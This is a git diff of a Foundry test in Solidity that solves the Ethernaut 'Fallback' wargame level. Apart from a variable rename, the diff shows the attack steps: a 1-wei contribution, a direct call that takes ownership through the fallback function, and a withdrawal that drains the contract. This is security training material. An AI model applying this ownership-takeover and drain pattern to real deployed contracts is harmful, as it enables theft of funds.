@@ -28,24 +28,24 @@ contract FallbackTest is DSTest {
         ethernaut.registerLevel(fallbackFactory);
         vm.startPrank(eoaAddress);
         address levelAddress = ethernaut.createLevelInstance(fallbackFactory);
-        Fallback ethernautFallback = Fallback(payable(levelAddress));
+        Fallback fallbackInstance = Fallback(payable(levelAddress));
 
         //////////////////
         // LEVEL ATTACK //
         //////////////////
 
         // Pay a small contribution
-        ethernautFallback.contribute{value : 1 wei}();
-        assertEq(ethernautFallback.getContribution(), 1 wei, "Contribution failed.");
+        fallbackInstance.contribute{value : 1 wei}();
+        assertEq(fallbackInstance.getContribution(), 1 wei, "Contribution failed.");
 
         // Make me the owner
-        (bool result,) = payable(address(ethernautFallback)).call{value : 1}("");
+        (bool result,) = payable(address(fallbackInstance)).call{value : 1}("");
         require(result);
-        assertEq(ethernautFallback.owner(), eoaAddress, "Setting owner failed.");
+        assertEq(fallbackInstance.owner(), eoaAddress, "Setting owner failed.");
 
-        emit log_named_uint("Fallback contract balance before attack", address(ethernautFallback).balance);
-        ethernautFallback.withdraw();
-        emit log_named_uint("Fallback contract balance after attack", address(ethernautFallback).balance);
+        emit log_named_uint("Fallback contract balance before attack", address(fallbackInstance).balance);
+        fallbackInstance.withdraw();
+        emit log_named_uint("Fallback contract balance after attack", address(fallbackInstance).balance);
 
         //////////////////////
         // LEVEL SUBMISSION //
